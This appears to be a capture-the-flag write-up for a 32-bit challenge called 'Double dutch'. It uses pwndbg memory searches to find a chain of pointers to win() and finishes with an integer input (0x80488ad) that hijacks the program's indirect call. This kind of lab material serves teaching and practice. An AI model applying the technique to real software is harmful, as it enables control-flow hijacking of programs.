# Double dutch:

## Protections:
* NX stack
* Canary
* Probably ASLR

## Exploit notes:
* The address of win() is 0x08048884
* We feed the program an address and this address is derefernced 3 times as
shown below:
```Assembly
    mov eax, dword ptr [esp + 0x14]     # this is the number from scanf("%d")
    mov eax, dword ptr [eax]            
    mov eax, dword ptr [eax]
    ...
    just a bunch of operations that don't change eax
    ...
    call eax
```

## Initial thoughts:
* Maybe the address of win is on the stack.

## Search for address of win():
* We can use the pwn plugin called "search" to find the address of win() is it is
present anywhere in memory:
```
pwndbg> search -t dword 0x08048884
0x804889c test   byte ptr [eax + 0x4080804], cl

pwndbg> x/32x 0x804889c
0x804889c <instruction_list+3>:	0x08048884	0x90880408	0x08048899	0x99880408
0x80488ac <instruction_list+19>:	0x04889c9b	0x04889d08	0xc35d9008	0x83e58955
0x80488bc <main+4>:	0xec83f0e4	0x2404c720	0x080c08bc	0x007e83e8
0x80488cc <main+20>:	0x0498a100	0x0489080f	0x7bd6e824	0x448d0000
0x80488dc <main+36>:	0x44891424	0x04c70424	0x0c08e324	0x7582e808
0x80488ec <main+52>:	0x448b0000	0x008b1424	0x4489008b	0x448b1824
0x80488fc <main+68>:	0x44891824	0x448b1c24	0xd0ff1c24	0x000000b8
0x804890c <main+84>:	0x90c3c900	0x53565755	0x00096de8	0xe7c58100

pwndbg> search -t dword 0x804889c
0x80488ad pushfd

pwndbg> x/32x 0x80488ad
0x80488ad <instruction_list+20>:	0x0804889c	0x0804889d	0x55c35d90	0xe483e589
0x80488bd <main+5>:	0x20ec83f0	0xbc2404c7	0xe8080c08	0x00007e83
0x80488cd <main+21>:	0x0f0498a1	0x24048908	0x007bd6e8	0x24448d00
0x80488dd <main+37>:	0x24448914	0x2404c704	0x080c08e3	0x007582e8
0x80488ed <main+53>:	0x24448b00	0x8b008b14	0x24448900	0x24448b18
0x80488fd <main+69>:	0x24448918	0x24448b1c	0xb8d0ff1c	0x00000000
0x804890d <main+85>:	0x5590c3c9	0xe8535657	0x0000096d	0x76e7c581
0x804891d <get_common_indeces.constprop.1+13>:	0xec81000a	0x00000108	0x0c89c085	0xc8840f24
pwndbg>
```

## Steps to exploit:
* We basically feed the program 0x80488ad which is 134514861 as an integer.

## Scripts used:
* See exploit.py
